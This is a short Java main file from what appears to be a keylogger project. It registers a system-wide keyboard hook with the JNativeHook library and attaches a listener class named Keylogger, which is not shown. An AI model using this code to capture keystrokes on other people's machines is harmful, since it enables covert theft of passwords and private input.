package com.wilhelm.konsza;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) {

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new Keylogger());
    }
}
